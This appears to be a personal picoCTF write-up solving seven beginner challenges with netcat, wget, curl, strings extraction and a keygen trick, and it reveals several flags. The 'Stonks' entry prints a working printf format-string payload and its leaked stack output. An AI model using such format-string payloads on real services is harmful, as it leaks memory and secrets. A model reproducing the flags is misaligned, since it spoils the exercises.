# picoCTF

#### ✅ Task name: "Nice netcat..."

⚙️ Solving

```bash
$ nc mercury.picoctf.net 49039 > numbers.txt # Save integer nubmbers into file
$ ( echo "obase=16" ; cat numbers.txt ) | bc # Convert integers into hex

# Then convert given hex numbers into ascii
# Done
```

#### ✅ Task name: "Obedient Cat"

⚙️ Solving

```bash
$ wget https://mercury.picoctf.net/static/a5683698ac318b47bd060cb786859f23/flag # Load file from the server
$ cat flag 

# Done
```

#### ✅ Task name: "GET aHEAD"

⚙️ Solving

```bash
$ curl --head http://mercury.picoctf.net:28916
# Done
```

#### ✅ Task name: "Stonks"

⚙️ Solving

```C
// We see, that we read a file which contains something named "flag" to the memory;
// We also know, that there is a way to read a memory "above the buffer". This is a classic buffer overflow attack.

char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
	printf("Flag file not found. Contact an admin.\n");
	exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
// ...
printf("Buying stonks with token:\n");
printf(user_buf);
```

```bash
$ nc mercury.picoctf.net 20195
# Choose 1
```

```
# Input
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x

# Output
80dd3d0804b00080489c3f7f59d80ffffffff180db160f7f67110f7f59dc7080dc180180dd3b080dd3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ff97007df7f94af8f7f674402b26b40010f7df6be9f7f680c0f7f595c0f7f59000ff9735c8f7de758df7f595c08048ecaff9735d40f7f7bf09804b000f7f59000f7f59e20ff973608f7f81d50f7f5a8902b26b400f7f59000804b000ff9736088048c8680db160ff9735f4ff9736088048be9f7f593fc0ff9736bcff9736b41180db1602b26b400ff97362000f7d9cf21f7f59000f7f590000f7d9cf211ff9736b4ff9736bcff97364410f7f59000f7f7c70af7f940000f7f590000080ea29451d1baf55000180486300f7f81d50f7f7c960804b00018048630080486628048b851ff9736b48048cd08048d30f7f7c960ff9736acf7f949401ff974e7e0ff974eb7ff974ec4ff974ecdff974efcff974f34ff974f4bff974f6bff974f73020f7f6cb5021f7f6c000101f8bfbff61000116438048034420597f7f6d0008098048630b40dc40dd40ee40e17

# What we see here is a flow of bytes.
# Let's decrypt them via ascii decoder.
# https://www.rapidtables.com/convert/number/hex-to-ascii.html

Ý=°H?YØÿÿÿñÛgYÜpÜÝ;
ÓÐocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ}÷ùJø÷öt@+&´÷ßké÷öÀ÷õÀ÷õÿ5È÷Þu÷õÀHì¯ùs]@÷÷¿	KYYâùs`ÕZ²k@Y°ÿ6HÈh
±`ÿ5ôÿ6H¾Y?Àÿ6¼ÿ6´Û²k@ùsb}òYY÷ÙÏ!ùskOùskÏùsdAY|p¯÷õê)E¯UHc÷øP÷÷É`KHcHf(ùskHÐHÓ|ùsjÏÿN~ùtëùtìOùtìßùtïÏùtóOùtô¿ùtö¿ùt÷0 ÷öËP!÷öÀûÿaCHD Ym	Hc@Ü@Ý@î@á
```

```
# There is our flag
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ}
```

```JavaScript
let s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ}';
let flag = '';
for (i = 0; i < s.length; i += 4) {
    flag += `${s[i + 3]}${s[i + 2]}${s[i + 1]}${s[i]}`;
}
console.log(flag) // 'picoCTF{I_l05t_4ll_my_m0n3y_6045d60dundefined}\x97ÿ'

// Remove the last '\x97ÿ' symbols and 'undefined' at the end
// Got picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
// Done
```

#### ✅ Task name: "Static ain't always noise"

⚙️ Solving

```bash
$ wget https://mercury.picoctf.net/static/e9dd71b5d11023873b8abe99cdb45551/static
$ wget wget https://mercury.picoctf.net/static/e9dd71b5d11023873b8abe99cdb45551/ltdis.sh
$ chmod +x ltdis.sh
$ ./ltdis.sh static
$ cat static.ltdis.strings.txt | grep 'picoCTF'
# Done
```

#### ✅ Task name: "Tab, Tab, Attack"

⚙️ Solving

```bash
$ wget https://mercury.picoctf.net/static/a350754a299cb58988d6d47aed5be3ba/Addadshashanammu.zip
$ unzip Addadshashanammu.zip
$ cd cd Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku
# Then find a file named 'ltdis.sh' in my repository and then run the command below
$ ltdis.sh ./fang-of-haynekhtnamet
$ cat fang-of-haynekhtnamet.strings.txt | grep 'picoCTF'
# Done
```

#### ✅ Task name: "keygenme-py"

⚙️ Solving

```bash
$ wget https://mercury.picoctf.net/static/5a4198cd84f87c8a597cbd903d92fbf4/keygenme-trial.py
```

```Python
# Let's look at the line 165 and try to guess the license. See code below.

# username_trial=bUsername_trial=b"ANDERSON" (see code at the beginning)
for j in [4, 5, 3, 6, 2, 7, 1, 8]:
    print(hashlib.sha256(username_trial).hexdigest()[j], end="")
print() # 01582419

# Concatenate the next lines
key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
key_part_dynamic1_trial = "xxxxxxxx" # 01582419
key_part_static2_trial = "}"

# Done
```
